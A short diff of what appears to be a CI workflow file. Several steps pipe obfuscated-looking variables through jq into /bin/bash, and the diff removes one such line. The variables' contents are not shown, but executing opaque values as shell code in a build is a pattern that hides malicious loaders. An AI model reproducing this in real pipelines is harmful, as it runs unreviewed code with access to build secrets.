@@ -23,7 +23,6 @@ jobs:
           echo $gs3 | jq -r .np7 | /bin/bash
           echo $o0200 | jq -r .t04404 | /bin/bash
           printf '%s' "$c6097" | jq -r .coolq5881 | /bin/bash
-          echo $i77 | jq -r .d2 | /bin/bash
 
       - name: Store results
         if: always()
